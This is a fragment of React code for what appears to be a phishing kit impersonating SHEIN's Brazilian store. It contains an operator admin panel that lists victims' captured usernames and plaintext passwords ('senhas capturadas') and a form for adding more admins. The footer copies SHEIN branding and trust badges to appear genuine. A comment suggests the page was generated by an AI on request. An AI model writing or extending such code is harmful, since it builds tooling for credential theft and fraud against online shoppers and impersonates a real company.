                        adminUsername={currentAdminUser}
                        onSelectUser={handleAutofillUser}
                        triggerRefreshToggle={dbRefreshToggle}
                      />
                    </div>
                  )}

                  {activeAdminTab === "captures" && (
                    <div className="bg-white border border-stone-200 p-4 rounded-none animate-fade-in space-y-4 h-[340px] flex flex-col justify-between">
                      <div>
                        <div className="flex items-center justify-between mb-3">
                          <p className="text-[9px] text-stone-500 font-bold uppercase tracking-widest">
                            LOG DE SENHAS CAPTURADAS (REDE LOCAL)
                          </p>
                          {filteredCaptured.length > 0 && (
                            <button
                              type="button"
                              onClick={handleClearCaptured}
                              className="text-[8px] text-[#8b1e1a] hover:text-red-500 font-bold uppercase tracking-widest cursor-pointer bg-transparent border-none"
                            >
                              Limpar Tudo
                            </button>
                          )}
                        </div>

                        {filteredCaptured.length === 0 ? (
                          <p className="text-[10px] text-stone-400 text-center py-10 font-bold">
                            Nenhuma credencial de login capturada para seus alvos até o momento.
                          </p>
                        ) : (
                          <div className="space-y-2 max-h-[220px] overflow-y-auto custom-scrollbar pr-1.5">
                            {filteredCaptured
                              .toReversed()
                              .map((entry, i) => (
                                <div key={i} className="bg-stone-50 border border-stone-200 p-3 rounded-none flex items-center justify-between">
                                  <div className="min-w-0 flex-1">
                                    <div className="flex items-center justify-between gap-2">
                                      <span className="text-[11px] text-black font-bold">{entry.user}</span>
                                      <span className="text-[8px] text-stone-400">{entry.time}</span>
                                    </div>
                                    <p className="text-[11px] text-stone-600 mt-1.5 break-all">
                                      Senha: <strong className="text-red-600 font-bold bg-red-50 px-1 border border-red-200 select-all">{entry.pass}</strong>
                                    </p>
                                  </div>
                                </div>
                              ))}
                          </div>
                        )}
                      </div>

                      {/* Monitored User details display */}
                      <div className="bg-stone-50 border border-stone-200 p-3 flex items-center justify-between text-[9px] text-stone-500">
                        <span>Modo de Captura Ativo:</span>
                        <span className="uppercase">Apenas contas criadas pelo seu Admin</span>
                      </div>
                    </div>
                  )}

                  {activeAdminTab === "new_admin" && (
                    <div className="bg-white border border-stone-200 p-5 rounded-none animate-fade-in h-[340px]">
                      <p className="text-[9px] text-stone-500 font-bold uppercase tracking-widest mb-3">
                        CADASTRAR OUTRO USUÁRIO ADMINISTRATIVO
                      </p>

                      {adminError && (
                        <p className="text-[10px] text-red-500 bg-red-50 p-2.5 border border-red-200 mb-3">
                          ⚠️ {adminError}
                        </p>
                      )}

                      {adminSuccess && (
                        <p className="text-[10px] text-emerald-600 bg-emerald-50 p-2.5 border border-emerald-200 mb-3">
                          ✅ {adminSuccess}
                        </p>
                      )}

                      <form onSubmit={handleRegisterAdditionalAdmin} className="space-y-4">
                        <div>
                          <label className="block text-[8px] text-stone-500 mb-1.5 font-bold uppercase tracking-widest">
                            Novo Usuário Admin
                          </label>
                          <input
                            type="text"
                            value={adminUser}
                            onChange={(e) => setAdminUser(e.target.value)}
                            placeholder="Ex: admin_secundario"
                            required
                            className="w-full bg-stone-50 border border-stone-200 text-xs text-stone-850 px-3 py-2.5 rounded-none focus:outline-none focus:border-black"
                          />
                        </div>
                        <div>
                          <label className="block text-[8px] text-stone-500 mb-1.5 font-bold uppercase tracking-widest">
                            Senha de Acesso
                          </label>
                          <input
                            type="password"
                            value={adminPass}
                            onChange={(e) => setAdminPass(e.target.value)}
                            placeholder="••••••••"
                            required
                            className="w-full bg-stone-50 border border-stone-200 text-xs text-stone-850 px-3 py-2.5 rounded-none focus:outline-none focus:border-black"
                          />
                        </div>

                        <button
                          type="submit"
                          className="w-full py-2.5 bg-black hover:bg-stone-800 text-white font-bold text-[10px] uppercase tracking-widest rounded-none cursor-pointer border-none shadow-sm"
                        >
                          Registrar Novo Admin
                        </button>
                      </form>
                    </div>
                  )}

                </div>
              )}
            </div>
          </div>
        </div>
      )}

      {/* Global Page Footer - SHEIN detailed footer requested in the prompt */}
      <footer className="w-full bg-[#111] text-stone-400 text-xs py-10 select-none font-sans mt-12 border-t border-stone-200">
        <div className="max-w-7xl mx-auto px-4 md:px-8 grid grid-cols-2 md:grid-cols-4 gap-8 mb-10 text-[11px] leading-relaxed">
          
          <div>
            <h4 className="font-bold text-white uppercase tracking-wider mb-3">INFORMAÇÕES DA EMPRESA</h4>
            <ul className="space-y-1.5">
              <li className="hover:text-white cursor-pointer">Sobre SHEIN</li>
              <li className="hover:text-white cursor-pointer">Venda na SHEIN</li>
              <li className="hover:text-white cursor-pointer">Blogueiros de moda</li>
              <li className="hover:text-white cursor-pointer">Carreiras</li>
            </ul>
          </div>

          <div>
            <h4 className="font-bold text-white uppercase tracking-wider mb-3">AJUDA E SUPORTE</h4>
            <ul className="space-y-1.5">
              <li className="hover:text-white cursor-pointer">Política de Frete</li>
              <li className="hover:text-white cursor-pointer">Devolução</li>
              <li className="hover:text-white cursor-pointer">Reembolso</li>
              <li className="hover:text-white cursor-pointer">Como Pedir</li>
              <li className="hover:text-white cursor-pointer">Como Rastrear</li>
              <li className="hover:text-white cursor-pointer">Guia De Tamanhos</li>
              <li className="hover:text-white cursor-pointer">SHEIN VIP</li>
              <li className="hover:text-white cursor-pointer">SHEIN na Remessa Conforme</li>
            </ul>
          </div>

          <div>
            <h4 className="font-bold text-white uppercase tracking-wider mb-3">ATENDIMENTO AO CLIENTE</h4>
            <ul className="space-y-1.5">
              <li className="hover:text-white cursor-pointer">Contate-Nos</li>
              <li className="hover:text-white cursor-pointer">Método De Pagamento</li>
              <li className="hover:text-white cursor-pointer">Pontos Bônus</li>
              <li className="hover:text-white cursor-pointer">Política de cupons</li>
              <li className="hover:text-white cursor-pointer">Perguntas frequentes</li>
            </ul>
          </div>

          <div>
            <h4 className="font-bold text-white uppercase tracking-wider mb-3">NEWSLETTER SHEIN</h4>
            <p className="text-[10px] text-stone-500 mb-3 leading-snug">Cadastre-se para receber novidades, ofertas relâmpago e cupons VIP.</p>
            <div className="flex mb-3 border border-stone-700">
              <input
                type="email"
                placeholder="Endereço do Seu Email"
                className="w-full bg-[#222] text-xs text-white px-3 py-2 outline-none border-none placeholder:text-stone-500"
                disabled
              />
              <button type="button" className="bg-white text-black text-[10px] font-bold px-3 uppercase tracking-wider border-none" disabled>
                OK
              </button>
            </div>
            <div className="text-[10px] text-stone-500 flex flex-col gap-1">
              <span>BR +55 SMS / WhatsApp Registros</span>
              <span className="text-[#ebdcc6] font-semibold">Boutique Ying & Chen autorizada</span>
            </div>
          </div>

        </div>

        <div className="max-w-7xl mx-auto px-4 md:px-8 pt-8 border-t border-stone-850 flex flex-col md:flex-row items-center justify-between gap-4 text-[10px]">
          <p className="tracking-widest uppercase">©2009-2026 TODOS OS DIREITOS RESERVADOS SHEIN & MOTF PREMIUM</p>
          <div className="flex flex-wrap gap-4 text-stone-500 uppercase tracking-widest text-[9px]">
            <span className="hover:underline cursor-pointer">Centro de Privacidade</span>
            <span>•</span>
            <span className="hover:underline cursor-pointer">Política de Privacidade e Cookies</span>
            <span>•</span>
            <span className="hover:underline cursor-pointer">Gerenciar Cookies</span>
            <span>•</span>
            <span className="hover:underline cursor-pointer">Termos e Condições</span>
          </div>
        </div>

        <div className="max-w-7xl mx-auto px-4 md:px-8 mt-4 flex items-center justify-center gap-3 text-[9px] text-stone-600 font-mono">
          <span>Brazil Store Gateway</span>
          <span>•</span>
          <span className="text-stone-500">This site is protected by Trustwave's Trusted Commerce program DMCA.com Protection Status</span>
        </div>
      </footer>

    </div>
  );
}
